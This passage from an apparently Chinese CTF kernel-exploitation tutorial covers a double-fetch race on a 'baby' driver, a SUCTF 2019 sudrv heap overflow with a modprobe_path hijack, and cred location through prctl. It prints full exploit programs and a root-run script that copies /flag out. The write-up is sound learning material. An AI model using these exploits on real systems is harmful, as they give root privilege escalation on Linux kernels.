<p>ioctl主要有两个功能,cmd=0x6666的时候输出flag的地址到dmesg里，cmd=0x1337的时候开始进行校验。检查的内容是指针是否是用户态空间数据，指针内部的flag_str指针是否是用户态数据，非用户态的话会直接返回，第三个检查是flag_str的长度是否和flag长度一致，我们这里利用double fetch的漏洞，先从dmesg里得到flag的地址，之后构造恶意线程不断往用户态的一个数据指针里修改flag_str为内核flag地址，这样在经过三次校验之后有一定几率在校验flag字节前把flag_str改为实际flag地址，之后即可输出flag。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">baby_ioctl</span><span class="params">(__int64 a1, __int64 arg1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 arg2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp-5Ch] [rbp-5Ch]</span></span><br><span class="line">  __int64 arg22; <span class="comment">// [rsp-58h] [rbp-58h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__(a1, arg1);</span><br><span class="line">  arg22 = arg2;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)arg1 == <span class="number">0x6666</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">"Your flag is at %px! But I don't think you know it's content\n"</span>, flag);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( (_DWORD)arg1 == <span class="number">0x1337</span></span><br><span class="line">         &amp;&amp; !_chk_range_not_ok(arg2, <span class="number">16L</span>L, *(_QWORD *)(__readgsqword((<span class="keyword">unsigned</span> __int64)&amp;current_task) + <span class="number">0x1358</span>))</span><br><span class="line">         &amp;&amp; !_chk_range_not_ok(</span><br><span class="line">               *(_QWORD *)arg22,</span><br><span class="line">               *(<span class="keyword">signed</span> <span class="keyword">int</span> *)(arg22 + <span class="number">8</span>),</span><br><span class="line">               *(_QWORD *)(__readgsqword((<span class="keyword">unsigned</span> __int64)&amp;current_task) + <span class="number">0x1358</span>))</span><br><span class="line">         &amp;&amp; *(_DWORD *)(arg22 + <span class="number">8</span>) == <span class="built_in">strlen</span>(flag) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(flag); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(*(_QWORD *)arg22 + i) != flag[i] )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">22L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    printk(<span class="string">"Looks like the flag is not a secret anymore. So here is it %s\n"</span>, flag);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">14L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="exp-c-2"><a href="#exp-c-2" class="headerlink" title="exp.c"></a>exp.c</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LEN 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">attr</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span>* flag;</span><br><span class="line">    <span class="keyword">size_t</span> len;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> is_finished = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> buf[LEN+<span class="number">1</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> flag_addr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change_attr</span><span class="params">(<span class="keyword">void</span>* s)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">attr</span>* <span class="title">s1</span> = <span class="title">s</span>;</span></span><br><span class="line">    <span class="keyword">while</span>(!is_finished)</span><br><span class="line">        s1-&gt;flag = flag_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//leak flag address from dmesg</span></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/baby"</span>,<span class="number">0</span>);</span><br><span class="line">    ioctl(fd,<span class="number">0x6666</span>);</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    system(<span class="string">"dmesg &gt; /tmp/record.txt"</span>);</span><br><span class="line">    <span class="keyword">int</span> dmesg_fd = open(<span class="string">"/tmp/record.txt"</span>,O_RDONLY);</span><br><span class="line">    lseek(dmesg_fd,<span class="number">-0x1000</span>,SEEK_END);</span><br><span class="line">    read(dmesg_fd,buf,LEN);</span><br><span class="line">    close(dmesg_fd);</span><br><span class="line">    <span class="keyword">char</span>* pos = <span class="built_in">strstr</span>(buf,<span class="string">"Your flag is at "</span>);</span><br><span class="line">    <span class="keyword">if</span>(pos == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Not found\n"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        pos += <span class="number">0x10</span>;</span><br><span class="line">    flag_addr = strtoull(pos,pos+<span class="number">0x10</span>,<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]flag addr:%p"</span>,flag_addr);</span><br><span class="line">    <span class="comment">//create threads</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">attr</span> <span class="title">t</span>;</span></span><br><span class="line">    t.flag = buf;</span><br><span class="line">    t.len = <span class="number">33</span>;</span><br><span class="line">    <span class="keyword">pthread_t</span> t1;</span><br><span class="line">    pthread_create(&amp;t1,<span class="literal">NULL</span>,change_attr,&amp;t);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">0x1000</span>;i++)&#123;</span><br><span class="line">        ioctl(fd,<span class="number">0x1337</span>,&amp;t);</span><br><span class="line">        t.flag = buf;</span><br><span class="line">    &#125;</span><br><span class="line">    is_finished = <span class="number">1</span>;</span><br><span class="line">    pthread_join(t1,<span class="literal">NULL</span>);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[*]result:\n"</span>);</span><br><span class="line">    system(<span class="string">"dmesg | grep flag"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Heap-Overflow"><a href="#Heap-Overflow" class="headerlink" title="Heap Overflow"></a>Heap Overflow</h2><h3 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h3><p>之前介绍的大部分都是栈的内容，内核堆漏洞也是蛮多的，最简单的莫过于堆溢出，因为slab的分配类似fastbin，我们可以通过溢出覆盖下一个free_chunk的fd两次分配到任意地址。</p>
<h3 id="SUCTF-2019-sudrv"><a href="#SUCTF-2019-sudrv" class="headerlink" title="SUCTF 2019 sudrv"></a>SUCTF 2019 sudrv</h3><h4 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>ioctl给了仨功能，分别是分配、释放和输出堆块内容，其中<code>sudrv_ioctl_cold_2</code>函数有格式化字符串漏洞，可以通过<code>%llx</code>泄露栈上的内容，进而从dmesg里获取泄露的函数相关地址以及栈地址，通过堆溢出(write未检查buf和size)我们可以分配到堆到栈上进行溢出写<code>rop</code>。</p>
<p>除此之外，我们还可以通过劫持<code>modprobe_path</code>不起root shell但是可以以root身份执行任意命令，比如把flag拷贝到/tmp目录下并给777权限之后查看。这个原理是内核在运行异常的时候会调用modprobe_path指向的文件，我们改成自己编写的getflag.sh即可，执行完exp之后手动取执行/tmp/ll(一个格式错误的可执行文件)即可触发读取flag。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sudrv_ioctl</span><span class="params">(__int64 a1, <span class="keyword">int</span> cmd, __int64 arg2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> ( cmd )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x73311337</span>:</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)(arg2 - <span class="number">1</span>) &gt; <span class="number">0xFFE</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">      su_buf = (<span class="keyword">char</span> *)_kmalloc(arg2, <span class="number">0x480020</span>LL);<span class="comment">// add</span></span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> (<span class="keyword">int</span>)<span class="number">0xDEADBEEF</span>:</span><br><span class="line">      JUMPOUT(su_buf, <span class="number">0L</span>L, sudrv_ioctl_cold_2); <span class="comment">// format string leak address</span></span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x13377331</span>:</span><br><span class="line">      kfree(su_buf);</span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">      su_buf = <span class="number">0L</span>L;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">sudrv_ioctl_cold_2</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  printk(a1);</span><br><span class="line">  JUMPOUT(&amp;loc_38);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意在这里的modprobe_path在/proc/kallsyms里没有符号，我们可以通过引用找到它<a href="https://www.anquanke.com/post/id/185911#h3-2" target="_blank" rel="noopener">参考</a>，先找到<code>__request_module</code>函数，在gdb里查看函数汇编即可找到<code>modprobe_path</code>。在这里未开kalsr的时候是<code>0xffffffff82242320</code><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/ # cat /proc/kallsyms | grep __request</span><br><span class="line">ffffffff81065210 t __request_resource</span><br><span class="line">ffffffff81065d60 T __request_region</span><br><span class="line">ffffffff810833e0 T __request_module</span><br><span class="line">ffffffff8108378b t __request_module.cold.4</span><br><span class="line">ffffffff810b2c10 T __request_percpu_irq</span><br><span class="line"></span><br><span class="line">gdb-peda$ x/28i 0xffffffff810833e0                                </span><br><span class="line">   0xffffffff810833e0:  push   rbp</span><br><span class="line">   0xffffffff810833e1:  mov    rbp,rsp</span><br><span class="line">   0xffffffff810833e4:  push   r15</span><br><span class="line">   0xffffffff810833e6:  push   r14</span><br><span class="line">   0xffffffff810833e8:  push   r13</span><br><span class="line">   0xffffffff810833ea:  mov    r13,rsi</span><br><span class="line">   0xffffffff810833ed:  push   r12</span><br><span class="line">   0xffffffff810833ef:  movzx  r12d,dil</span><br><span class="line">   0xffffffff810833f3:  push   r10</span><br><span class="line">   0xffffffff810833f5:  lea    r10,[rbp+0x10]</span><br><span class="line">   0xffffffff810833f9:  push   rbx</span><br><span class="line">   0xffffffff810833fa:  mov    ebx,edi</span><br><span class="line">   0xffffffff810833fc:  sub    rsp,0xb8</span><br><span class="line">   0xffffffff81083403:  mov    QWORD PTR [rbp-0x50],rdx</span><br><span class="line">   0xffffffff81083407:  mov    QWORD PTR [rbp-0x48],rcx</span><br><span class="line">   0xffffffff8108340b:  mov    QWORD PTR [rbp-0x40],r8</span><br><span class="line">   0xffffffff8108340f:  mov    QWORD PTR [rbp-0x38],r9</span><br><span class="line">   0xffffffff81083413:  mov    rax,QWORD PTR gs:0x28</span><br><span class="line">   0xffffffff8108341c:  mov    QWORD PTR [rbp-0x68],rax</span><br><span class="line">   0xffffffff81083420:  xor    eax,eax</span><br><span class="line">   0xffffffff81083422:  test   dil,dil</span><br><span class="line">   0xffffffff81083425:  jne    0xffffffff810835a6</span><br><span class="line">   0xffffffff8108342b:  xor    r15d,r15d</span><br><span class="line">   0xffffffff8108342e:  cmp    BYTE PTR [rip+0x11beeeb],0x0        # 0xffffffff82242320</span><br><span class="line">   0xffffffff81083435:  jne    0xffffffff8108345e</span><br><span class="line">   0xffffffff81083437:  mov    rcx,QWORD PTR [rbp-0x68]</span><br><span class="line">   0xffffffff8108343b:  xor    rcx,QWORD PTR gs:0x28</span><br><span class="line">   0xffffffff81083444:  mov    eax,r15d</span><br><span class="line">gdb-peda$ x/s 0xffffffff82242320</span><br><span class="line">0xffffffff82242320:     &quot;/tmp/getflag.sh&quot;</span><br></pre></td></tr></table></figure></p>
<h4 id="exp-c-3"><a href="#exp-c-3" class="headerlink" title="exp.c"></a>exp.c</h4><p>exp来自17学长，在测试这个<code>fastbin</code>分配机制的时候我试了下改size，0x700、0x600和0x900均不行，最后是0x800和0x400成功，挠头.jpg，找了下也没有讲的很好的slab/slub分配机制的文章，回头再说好了。</p>
<p>使用的时候使用管道作为输入<code>printf &#39;\x20\x23\x24\x82\xff\xff\xff\xff&#39; | ./exp</code>，执行完exp之后执行/tmp/ll再<code>cat /tmp/flag</code>即可。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CREATE 0x73311337</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHOW 0xDEADBEEF</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DELETE 0x13377331</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create_slab</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> size)</span> </span>&#123;</span><br><span class="line">    ioctl(fd, CREATE, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(<span class="keyword">int</span> fd)</span> </span>&#123;</span><br><span class="line">    ioctl(fd, SHOW, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">(<span class="keyword">int</span> fd)</span></span>&#123;</span><br><span class="line">    ioctl(fd, DELETE, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    system(<span class="string">"echo -ne '#!/bin/sh\n/bin/cp /flag /tmp/flag\n/bin/chmod 777 /tmp/flag' &gt; /tmp/getflag.sh"</span>);</span><br><span class="line">    system(<span class="string">"chmod +x /tmp/getflag.sh"</span>);</span><br><span class="line">    system(<span class="string">"echo -ne '\\xff\\xff\\xff\\xff' &gt; /tmp/ll"</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/meizijiutql"</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">'a'</span>, <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    create_slab(fd, <span class="number">0x80</span>);</span><br><span class="line"></span><br><span class="line">    write(fd, buf, <span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line">    show(fd);</span><br><span class="line">    show(fd);</span><br><span class="line">    show(fd);</span><br><span class="line">    show(fd);</span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *modprobe_addr = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    create_slab(fd, <span class="number">0x400</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(modprobe_addr, <span class="string">'\x00'</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">'\x00'</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">'a'</span>, <span class="number">0x400</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Please input modprobe_addr:"</span>);</span><br><span class="line"></span><br><span class="line">    read(<span class="number">0</span>, modprobe_addr, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcat</span>(buf, modprobe_addr);</span><br><span class="line"></span><br><span class="line">    write(fd, buf, <span class="number">0x408</span>);</span><br><span class="line"></span><br><span class="line">    create_slab(fd, <span class="number">0x400</span>);</span><br><span class="line">    write(fd, <span class="string">"/tmp/getflag.sh\x00"</span>, <span class="number">17</span>);</span><br><span class="line">    create_slab(fd, <span class="number">0x400</span>);</span><br><span class="line">    write(fd, <span class="string">"/tmp/getflag.sh\x00"</span>, <span class="number">17</span>);</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="prctl爆破cred地址"><a href="#prctl爆破cred地址" class="headerlink" title="prctl爆破cred地址"></a>prctl爆破cred地址</h2><h3 id="简介-4"><a href="#简介-4" class="headerlink" title="简介"></a>简介</h3><p>是p4nda师傅介绍的三种<a href="http://p4nda.top/2018/11/07/stringipc/#EXP" target="_blank" rel="noopener">权限提升思路</a>，第一种也是最简单的思路就是直接修改cred结构体对应标识权限的数据为0，这里用到了一个leak cred地址的方式，首先我们要知道一些基础知识。每个线程在内核中都对应一个线程栈，一个thread_info结构体，这个结构体如下：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span>	*<span class="title">task</span>;</span>		<span class="comment">/* main task structure */</span></span><br><span class="line">	__u32			flags;		<span class="comment">/* low level flags */</span></span><br><span class="line">	__u32			status;		<span class="comment">/* thread synchronous flags */</span></span><br><span class="line">	__u32			cpu;		<span class="comment">/* current CPU */</span></span><br><span class="line">	<span class="keyword">mm_segment_t</span>		addr_limit;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		sig_on_uaccess_error:<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		uaccess_err:<span class="number">1</span>;	<span class="comment">/* uaccess failed */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>在这个结构体中cred结构体用以标识线程的权限，在cred结构体后8字节的位置有一个字符数组<code>char comm[TASK_COMM_LEN];</code>用来表示进程名(<code>不超过16字节</code>)，我们可以用<code>prctl</code>设置它的内容之后用任意读穷举搜索其位置，进而定位到cred地址，之后结合任意写改其内容即可。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">long</span> state;	<span class="comment">/* -1 unrunnable, 0 runnable, &gt;0 stopped */</span></span><br><span class="line">	<span class="keyword">void</span> *<span class="built_in">stack</span>;</span><br><span class="line">	<span class="keyword">atomic_t</span> usage;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> flags;	<span class="comment">/* per process flags, defined below */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> ptrace;</span><br><span class="line">... ...</span><br><span class="line"></span><br><span class="line"><span class="comment">/* process credentials */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span> *<span class="title">ptracer_cred</span>;</span> <span class="comment">/* Tracer's credentials at attach */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span> *<span class="title">real_cred</span>;</span> <span class="comment">/* objective and real subjective task</span></span><br><span class="line"><span class="comment">					 * credentials (COW) */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span> *<span class="title">cred</span>;</span>	<span class="comment">/* effective (overridable) subjective task</span></span><br><span class="line"><span class="comment">					 * credentials (COW) */</span></span><br><span class="line">	<span class="keyword">char</span> comm[TASK_COMM_LEN]; <span class="comment">/* executable name excluding path</span></span><br><span class="line"><span class="comment">				     - access with [gs]et_task_comm (which lock</span></span><br><span class="line"><span class="comment">				       it with task_lock())</span></span><br><span class="line"><span class="comment">				     - initialized normally by setup_new_exec */</span></span><br><span class="line"><span class="comment">/* file system info */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nameidata</span> *<span class="title">nameidata</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SYSVIPC</span></span><br><span class="line"><span class="comment">/* ipc stuff */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sysv_sem</span> <span class="title">sysvsem</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sysv_shm</span> <span class="title">sysvshm</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">... ... </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="keyword">void</span>		*put_addr;</span><br><span class="line">	<span class="keyword">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="keyword">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we're permitted */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">void</span>		*security;	<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
